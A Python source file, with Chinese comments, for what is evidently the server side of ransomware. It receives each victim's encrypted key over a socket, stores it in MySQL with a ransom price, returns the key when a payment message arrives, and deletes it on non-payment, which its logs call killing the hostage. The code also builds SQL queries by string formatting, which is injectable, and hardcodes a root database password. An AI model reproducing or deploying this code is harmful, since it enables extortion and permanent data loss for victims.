import socket
from threading import Thread
import math
import rsa
import mysql.connector
# 发送带长度的字符串
def send_string_with_length(_conn, content):
    # 先发送内容的长度
    _conn.sendall(bytes(content, encoding='utf-8').__len__().to_bytes(4, byteorder='big'))
    # 再发送内容
    _conn.sendall(bytes(content, encoding='utf-8'))

def send_number(_conn, number):
    _conn.sendall(int(number).to_bytes(4, byteorder='big'))

def recv_number(_conn):
    return int.from_bytes(_conn.recv(4), byteorder='big')

# 获取定长字符串
def recv_string_by_length(_conn, len):
    return str(_conn.recv(len), "utf-8")

# 获取变长字符串
def recv_all_string(_conn):
    # 获取消息长度
    length = int.from_bytes(_conn.recv(4), byteorder='big')
    b_size = 3 * 1024  # 注意utf8编码中汉字占3字节，英文占1字节
    times = math.ceil(length / b_size)
    content = ''
    for i in range(times):
        if i == times - 1:
            seg_b = _conn.recv(length % b_size)
        else:
            seg_b = _conn.recv(b_size)
        content += str(seg_b, encoding='utf-8')
    return content

def decrypt(crypt_text):  # 用私钥解密
    with open('private.pem', 'rb') as privatefile:
        p = privatefile.read()
    privkey = rsa.PrivateKey.load_pkcs1(p)
    lase_text = rsa.decrypt(crypt_text, privkey).decode()  # 注意，这里如果结果是bytes类型，就需要进行decode()转化为str
    return lase_text

def handle_recv_e_key(_conn,addr):
    print("接受加密密钥进行解密，并在数据库中的登记")

    length = int.from_bytes(_conn.recv(4), byteorder='big')
    #print(length)
    bytes_e_key = _conn.recv(length)
    #print(bytes_e_key)
    #print(len(bytes_e_key))
    d_key=decrypt(bytes_e_key)
    tmp= str(addr[0])+":"+str(addr[1])
    sql = "INSERT INTO info (addr, price,d_key) VALUES (%s,%s,%s)"
    val = (tmp, 666, d_key)
    mycursor.execute(sql, val)
    mydb.commit()
    print(mycursor.rowcount,"记录插入成功。")

    s = str(_conn.recv(1), "utf-8")
    if s=="2":
        handle_send_d_key(_conn,addr)

def handle_send_d_key(_conn,addr):
    print("收到付款，查找记录并返回AES密钥")
    tmp= str(addr[0])+":"+str(addr[1])
    print(tmp)

    sql = "select * from info where addr='%s'" % (tmp)
    mycursor.execute(sql)
    result = mycursor.fetchall()
    key = result[0][1]
    print(key)
    print(mycursor.rowcount, "记录查询成功。")
    send_string_with_length(_conn,key)

def handle_raise_price(_conn,addr):
    pass

def handle_delete_key(_conn,addr):
    print("超时未支付，准备撕票")
    tmp = str(addr[0]) + ":" + str(addr[1])
    print(tmp)
    sql = "delete from info where addr='%s'" % (tmp)
    mycursor.execute(sql)
    print(mycursor.rowcount, "撕票完成。")

def decrypt(crypt_text):  # 用私钥解密
    with open('private.pem', 'rb') as privatefile:
        p = privatefile.read()
    privkey = rsa.PrivateKey.load_pkcs1(p)
    lase_text = rsa.decrypt(crypt_text, privkey).decode()  # 注意，这里如果结果是bytes类型，就需要进行decode()转化为str
    return lase_text

def handle(_conn, addr):
    try:
        while True:
            # 获取请求类型
            _type = str(_conn.recv(1), "utf-8")
            print(_type)
            # 是否继续处理
            _goon = True
            if _type == "1":
                print(addr,"中招了！")
                _goon = handle_recv_e_key(_conn, addr)

            elif _type == "2":
                print(addr,"付款了！")
                _goon = handle_send_d_key(_conn, addr)

            elif _type == "3":  # 注册请求
                print(addr,"提价了！")
                _goon = handle_raise_price(_conn, addr)

            elif _type == "4":
                print(addr,"撕票了！")
                _goon = handle_delete_key(_conn, addr)

            if not _goon:
                break
    except Exception as e:
        print(str(addr) + " 连接异常，准备断开: " + str(e))
    finally:
        try:
            _conn.close()
        except:
            print(str(addr) + "连接关闭异常")
# 入口
if __name__ == "__main__":
    try:
        sk = socket.socket()
        sk.bind(('127.0.0.1', 12323))
        # 最大挂起数
        sk.listen(200)
        print("服务器启动成功，开始监听...")

        mydb = mysql.connector.connect(
            host="localhost",  # 数据库主机地址
            user="root",  # 数据库用户名
            passwd="123"  # 数据库密码
        )
        mycursor = mydb.cursor()
        mycursor.execute("use clients;")

        while True:
            conn, addr = sk.accept()
            Thread(target=handle, args=(conn, addr)).start()

    except Exception as e:
        print("服务器出错: " + str(e))
